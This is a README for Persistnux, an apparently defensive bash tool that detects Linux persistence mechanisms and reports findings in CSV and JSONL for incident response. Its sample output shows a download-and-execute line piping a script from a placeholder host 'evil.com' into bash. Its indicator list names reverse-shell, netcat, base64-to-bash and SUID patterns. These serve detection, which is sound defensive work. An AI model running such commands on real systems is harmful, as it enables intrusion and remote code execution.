# Persistnux

A comprehensive Linux persistence detection tool for Digital Forensics and Incident Response (DFIR) investigations.

## Overview

Persistnux is a bash-based tool designed to identify known Linux persistence mechanisms used by attackers to maintain access to compromised systems. It performs comprehensive checks across the system and generates detailed reports in both CSV and JSONL formats for further analysis.

## Features

- **Comprehensive Detection**: Covers all major Linux persistence mechanisms
- **Live Analysis**: Runs directly on live systems with minimal dependencies
- **Detailed Output**: Generates CSV and JSONL reports with file hashes, metadata, and confidence scores
- **Root and Non-Root**: Works with or without root privileges (with limited scope for non-root)
- **DFIR-Ready**: Output formats compatible with common DFIR tools and workflows
- **Suspicion Scoring**: Automatic confidence scoring (LOW, MEDIUM, HIGH, CRITICAL) based on indicators
- **False Positive Reduction**: Package manager integration and known-good service whitelisting
- **Time-Based Analysis**: Recently modified files receive higher confidence scores
- **Pattern Matching**: Detects reverse shells, download-execute patterns, obfuscation techniques

## Persistence Mechanisms Detected

### 1. Systemd Services
- Service files (`.service`) in `/etc/systemd/system`, `/lib/systemd/system`, `/usr/lib/systemd/system`
- User-level systemd services
- Filters out disabled services and services without ExecStart
- Detects suspicious ExecStart commands
- Verifies package integrity of executed binaries/scripts

### 2. Cron Jobs & Scheduled Tasks
- System crontabs (`/etc/crontab`, `/etc/cron.d/*`)
- Periodic execution directories (`/etc/cron.{daily,hourly,weekly,monthly}`)
- User crontabs for all users (root mode)
- At jobs
- Suspicious command patterns in scheduled tasks
- `/etc/cron.allow` and `/etc/cron.deny` ACL files — entries referencing nonexistent users flagged

### 3. Shell Profiles & RC Files
- System-wide profiles (`/etc/profile`, `/etc/bash.bashrc`, `/etc/zshrc`)
- Profile.d scripts (`/etc/profile.d/*`)
- User profiles (`.bashrc`, `.bash_profile`, `.zshrc`, `.profile`, etc.)
- Fish shell configurations
- Detects malicious commands in profile files

### 4. Init Scripts & RC.local
- `/etc/rc.local` and variants
- SysV init scripts (`/etc/init.d`)
- Runlevel scripts (`/etc/rc*.d`)
- Detects suspicious download/execution commands

### 5. Kernel Modules & Library Preloading
- LD_PRELOAD configurations (`/etc/ld.so.preload`) — each listed library verified via package manager
- Dynamic linker configurations (`/etc/ld.so.conf`, `/etc/ld.so.conf.d/`) — conf file integrity + non-standard path `.so` files scanned and verified
- `/etc/environment` LD_PRELOAD/LD_LIBRARY_PATH — env file flagged HIGH; referenced library paths verified (unmanaged/modified → CRITICAL)
- Kernel module parameters (`/etc/modprobe.d/`, `/etc/modprobe.conf`) — file integrity; `install` directives analyzed for suspicious command targets; `blacklist` of security modules (apparmor, selinux, seccomp) flagged HIGH
- Kernel module auto-load configs (`/etc/modules`, `/etc/modules-load.d/`) — config integrity; referenced module names resolved to `.ko` files via `modinfo` and verified
- Loaded kernel modules (`lsmod`) — enumeration and integrity verification

### 6. Additional Mechanisms
- XDG autostart entries (`.config/autostart`, `/etc/xdg/autostart`) — all user homes scanned when root
- System environment files (`/etc/environment`) — LD_PRELOAD/LD_LIBRARY_PATH library paths verified
- Sudoers configurations and drop-ins (`/etc/sudoers`, `/etc/sudoers.d/`) — NOPASSWD/ALL patterns → HIGH
- PAM (Pluggable Authentication Modules):
  - All `.so` modules verified via package manager; `@include` directives followed; `/etc/pam.conf` included
  - `pam_exec.so` script analysis — missing/suspicious scripts → CRITICAL
  - `pam_python.so` / `pam_perl.so` relay detection — script extracted and analyzed
  - `pam_script.so` hook file detection in `/etc/security/`
  - Config file integrity — modified package-owned PAM configs → CRITICAL
  - `pam_env.conf` and `~/.pam_environment` LD_PRELOAD library verification
  - `/etc/security/` general scan
- MOTD scripts (`/etc/update-motd.d/`) — package verification; modified → CRITICAL
- Git credential helpers and core.pager settings — content analysis for all users
- Web shells in common web directories

### 8. SSH Persistence
- Per-user `~/.ssh/authorized_keys` — recently modified keys flagged; `command=` option content analyzed for suspicious patterns
- Per-user `~/.ssh/rc` — presence flagged MEDIUM; suspicious/reverse shell content → HIGH/CRITICAL

### 9. Binary Hijacking
- Verifies installed system binaries against the package database (`dpkg -V` on Debian/Ubuntu, `rpm -Va` on RHEL/CentOS)
- Modified files in `/usr/bin`, `/usr/sbin`, `/bin`, `/sbin` → CRITICAL finding
- Modified PAM modules in `/lib/security` → CRITICAL finding
- Conffiles (dpkg configuration files) are excluded to avoid false positives

### 10. Bootloader & Initramfs
- GRUB `init=` kernel parameter injection (`/etc/default/grub`, `/etc/default/grub.d/*.cfg`)
- Root-level dropped init scripts at `/`
- Dracut initramfs modules with `pre-pivot` hooks writing to `/sysroot/etc/shadow`
- Ubuntu initramfs-tools hook scripts in `/etc/initramfs-tools/scripts/` and `/hooks/`
- Recently modified `/boot/initrd.img-*` images (mtime-based)

### 11. Polkit (PolicyKit) Manipulation
- `.pkla` files with unconditional `ResultAny/ResultInactive/ResultActive=yes`
- Wildcard identity (`unix-user:*`) grants
- `.rules` files with unconditional `polkit.Result.YES` (JavaScript-based Polkit >= 0.106)

### 12. D-Bus & NetworkManager
- Malicious D-Bus system service `Exec=` registration (`/usr/share/dbus-1/system-services/`)
- D-Bus policy wildcard `allow own="*"` or `send_destination="*"` directives
- NetworkManager dispatcher scripts (`/etc/NetworkManager/dispatcher.d/`)

### 13. Udev Rules
- Udev `RUN+=` directives executing arbitrary commands or scripts (`/etc/udev/rules.d/`, `/lib/udev/rules.d/`)
- Runtime-injected rules in `/run/udev/rules.d/`
- `at`/`cron` delegation patterns in `RUN+=` (common foreground restriction bypass)

### 14. Container Escape
- Privileged Docker containers (`--privileged`, `--pid=host`)
- `docker.sock` bind-mounts into containers (full host control via Docker API)
- `nsenter -t 1` in container entrypoints or Dockerfiles
- Dockerfiles in user-writable directories containing escape techniques

### 15. Advanced Binary & Privilege Checks
- Active SUID/SGID filesystem scan across system directories
- File capability scan via `getcap` — `cap_setuid+ep` on GTFOBins → CRITICAL
- Binary hijacking: renamed originals (`.original`, `.old`, `.bak`, `.real`) with wrapper scripts
- Non-root accounts with UID 0 in `/etc/passwd`
- Shell masking via trailing space in `/etc/passwd` shell field
- System accounts (UID 1-999) with SSH `authorized_keys` files

## Installation

```bash
# Clone the repository
git clone https://github.com/yourusername/persistnux.git
cd persistnux

# Make the script executable
chmod +x persistnux.sh
```

## Usage

### Basic Usage (Live Analysis)

```bash
# Run with default settings (shows only suspicious findings)
sudo ./persistnux.sh

# Show help and all options
./persistnux.sh --help

# Run as regular user (limited scope)
./persistnux.sh
```

### Filtering Options (v2.4+)

By default, Persistnux shows only **suspicious findings** (MEDIUM, HIGH, CRITICAL confidence) to reduce noise and focus on actionable threats.

```bash
# Default: Show only suspicious findings
sudo ./persistnux.sh

# Show all findings including baseline (LOW confidence)
sudo ./persistnux.sh --all
# OR
sudo FILTER_MODE=all ./persistnux.sh

# Show only HIGH and CRITICAL confidence findings
sudo MIN_CONFIDENCE=HIGH ./persistnux.sh

# Combine filters: HIGH confidence only
sudo ./persistnux.sh --min-confidence HIGH
```

### Custom Output Directory

```bash
# Specify custom output directory
sudo OUTPUT_DIR=/tmp/evidence ./persistnux.sh

# Combine with filtering
sudo OUTPUT_DIR=/tmp/evidence MIN_CONFIDENCE=HIGH ./persistnux.sh
```

### Output Files

By default, Persistnux creates an output directory `./persistnux_output/` containing:

- `persistnux_<hostname>_<timestamp>.csv` - CSV format report
- `persistnux_<hostname>_<timestamp>.jsonl` - JSONL format report (one JSON object per line)
- `persistnux_<hostname>_<timestamp>_report.txt` - Human-readable summary report with findings counts and scan metadata

## Output Format

### CSV Format

```csv
timestamp,hostname,category,confidence,file_path,file_hash,file_owner,file_permissions,file_age_days,package_status,command,description,matched_pattern,matched_string
2026-01-23T10:30:00Z,webserver01,Systemd Service,HIGH,/etc/systemd/system/example.service,abc123...,root:root,644,3,unmanaged,example.service,suspicious_script_content,"curl http://evil.com | bash"
```

### JSONL Format

```json
{
  "timestamp": "2026-01-23T10:30:00Z",
  "hostname": "webserver01",
  "category": "Systemd Service",
  "confidence": "HIGH",
  "file_path": "/etc/systemd/system/example.service",
  "file_hash": "abc123...",
  "file_owner": "root:root",
  "file_permissions": "644",
  "file_age_days": "3",
  "package_status": "unmanaged",
  "command": "/opt/example.sh",
  "description": "example.service",
  "matched_pattern": "suspicious_script_content",
  "matched_string": "curl http://evil.com | bash"
}
```

### Key Output Fields

- **matched_pattern**: The detection pattern that triggered the finding (e.g., `suspicious_script_content`, `modified_package`, `unmanaged_binary`)
- **matched_string**: The actual suspicious content found (full line, not just keyword)

## Confidence Scoring

Persistnux uses intelligent confidence scoring to reduce false positives:

- **LOW**: Standard system configuration, low suspicion (often package-managed files)
- **MEDIUM**: Potentially suspicious but could be legitimate
- **HIGH**: Suspicious patterns detected (e.g., curl/wget in cron, /tmp execution, reverse shells)
- **CRITICAL**: Definitive evidence of tampering — package integrity verification failure, SUID/SGID on a suspicious file, PAM module anomaly, systemd generator in ephemeral location, or inline interpreter code with high-entropy payload

### False Positive Reduction (v1.2+)

Persistnux now includes several features to reduce false positives:

1. **Package Manager Integration**: Files managed by `dpkg` (Debian/Ubuntu) or `rpm` (RedHat/CentOS) receive lower confidence scores
2. **Known-Good Service Whitelist**: Common vendor services (systemd-*, dbus-*, snap.*, etc.) are automatically skipped
3. **Time-Based Scoring**: Recently modified files (<7 days) receive higher confidence scores
4. **Context-Aware Analysis**: Combines multiple indicators for more accurate detection

## Suspicious Indicators

Persistnux automatically flags items with higher confidence when it detects:

### Network-Based Patterns
- Reverse shells: `bash -i >& /dev/tcp/`, `sh -i >& /dev/udp/`
- Network tools: `nc`, `netcat`, `socat`, `telnet`
- Socket operations in scripting languages: `python -c 'import socket'`

### Download and Execute Patterns
- Download tools: `curl | bash`, `wget | sh`
- Download with execution: `curl URL -o /tmp/file && chmod +x`

### Obfuscation Techniques
- Encoding: `base64 -d | bash`, `eval $(echo BASE64)`
- Dynamic execution: `eval`, `exec`

### Suspicious Locations
- Temporary directories: `/tmp`, `/dev/shm`, `/var/tmp`
- Hidden directories and files

### Permission Manipulation
- Making files executable: `chmod +x`, `chmod 777`
- SUID bit manipulation: `chmod u+s`

## Requirements

- Bash 4.0+
- Standard Unix utilities: `find`, `grep`, `stat`, `sha256sum`
- Optional: `systemctl`, `lsmod`, `modinfo` (for specific checks)
- Root/sudo access recommended for comprehensive analysis

## Tested On / Compatibility

| Distribution | Status | Notes |
|---|---|---|
| Ubuntu 22.04 LTS | ✅ Tested | Primary development and test platform |
| Ubuntu 20.04 LTS | ✅ Tested | Fully supported |
| Debian 11/12 | ✅ Tested | dpkg-based, same path conventions |
| RedHat / RHEL | ⚠️ Not yet tested | rpm support is implemented but unverified on live systems |
| Fedora | ⚠️ Not yet tested | rpm support is implemented but unverified on live systems |
| CentOS / AlmaLinux / Rocky | ⚠️ Not yet tested | rpm support is implemented but unverified on live systems |
| Arch Linux | 🔬 Experimental | pacman support implemented |

> **Note:** The tool is primarily tested on **Ubuntu/Debian** systems. RedHat, Fedora, and RPM-based distributions have package manager support implemented in code but have not been validated in live test environments. Contributions and test reports for RPM-based distros are welcome.

## DFIR Workflow Integration

### Example: Import into Splunk

```bash
# Index JSONL output
cat persistnux_*.jsonl | splunk add oneshot -sourcetype persistnux:jsonl
```

### Example: Analyze with jq

```bash
# Find all HIGH confidence findings
cat persistnux_*.jsonl | jq 'select(.confidence == "HIGH")'

# Group by category
cat persistnux_*.jsonl | jq -r '.category' | sort | uniq -c

# Find all systemd services with suspicious commands
cat persistnux_*.jsonl | jq 'select(.category == "Systemd Service" and .confidence == "HIGH")'
```

### Example: Import into Pandas (Python)

```python
import pandas as pd

# Load CSV
df = pd.read_csv('persistnux_hostname_timestamp.csv')

# Filter high-confidence findings
high_risk = df[df['confidence'] == 'HIGH']

# Group by category
df.groupby('category').size()
```

## Roadmap

- [ ] Offline analysis mode for forensic disk images
- [ ] UAC (Unix-like Artifacts Collector) integration
- [ ] YARA rule integration for binary analysis
- [ ] Timeline generation
- [ ] HTML report generation
- [ ] Baseline comparison mode
- [ ] Detection of rootkits (chkrootkit/rkhunter integration)

## Contributing

Contributions are welcome! Please feel free to submit pull requests or open issues for:

- New persistence mechanism detection
- Bug fixes
- Documentation improvements
- Performance optimizations
- Additional output formats

## License

MIT License - See LICENSE file for details

## Acknowledgments

Developed for the DFIR community to assist in Linux incident response and forensic investigations.

## Disclaimer

This tool is intended for authorized security testing, incident response, and forensic analysis only. Users are responsible for ensuring they have proper authorization before running this tool on any system.

## Contact

For questions, issues, or contributions, please use the GitHub issue tracker.
